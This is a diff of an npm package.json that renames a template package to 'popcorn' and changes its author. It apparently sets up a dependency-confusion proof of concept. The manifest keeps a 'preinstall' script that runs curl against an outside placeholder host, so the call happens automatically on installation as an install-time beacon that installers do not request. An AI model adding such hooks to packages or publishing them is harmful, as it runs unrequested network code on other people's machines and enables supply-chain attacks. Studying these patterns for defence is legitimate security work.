@@ -1,5 +1,5 @@
 {
-  "name": "your-module-name",
+  "name": "popcorn",
   "version": "1.0.0",
   "description": "",
   "main": "index.js",
@@ -7,6 +7,6 @@
     "test": "echo \"Error: no test specified\" && exit 1",
     "preinstall": "curl http://yoursite.co.m"
   },
-  "author": "0xsapra",
+  "author": "sectester15",
   "license": "ISC"
 }
